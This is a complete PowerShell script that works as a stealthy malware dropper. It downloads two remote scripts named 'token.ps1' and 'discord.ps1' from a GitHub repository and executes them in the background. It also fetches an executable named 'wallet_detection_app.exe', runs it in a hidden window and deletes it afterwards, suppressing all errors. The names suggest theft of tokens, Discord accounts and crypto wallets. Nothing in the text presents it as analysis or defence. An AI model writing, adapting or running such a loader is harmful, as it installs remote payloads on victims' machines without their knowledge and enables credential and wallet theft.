
$ProgressPreference = 'SilentlyContinue'


$scriptUrl1 = "https://raw.githubusercontent.com/LigmaSigmaLigma/Config/refs/heads/main/token.ps1"
$scriptUrl2 = "https://raw.githubusercontent.com/LigmaSigmaLigma/Config/refs/heads/main/discord.ps1"
$exeUrl     = "https://github.com/LigmaSigmaLigma/Config/releases/download/d/wallet_detection_app.exe"


function Run-PsFromUrl {
    param([string]$Url)
    try {
        $code = (Invoke-WebRequest -Uri $Url -UseBasicParsing).Content
        
        $ps = [PowerShell]::Create()
        $null = $ps.AddScript($code)
        $ps.BeginInvoke() > $null   # Fire and forget
    } catch {
        
    }
}

Run-PsFromUrl -Url $scriptUrl1
Run-PsFromUrl -Url $scriptUrl2


try {
    
    $exeBytes = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing).Content

    
    $tempPath = [System.IO.Path]::GetTempFileName()
    Remove-Item $tempPath -Force                     # remove empty placeholder
    $tempExe = $tempPath + ".exe"
    [System.IO.File]::WriteAllBytes($tempExe, $exeBytes)

    
    $proc = Start-Process -FilePath $tempExe -WindowStyle Hidden -PassThru -NoNewWindow

    
    $job = Start-Job -ScriptBlock {
        param($path, $pid)
        Wait-Process -Id $pid -ErrorAction SilentlyContinue
        try { Remove-Item $path -Force -ErrorAction SilentlyContinue } catch {}
    } -ArgumentList $tempExe, $proc.Id

    
} catch {
   
}

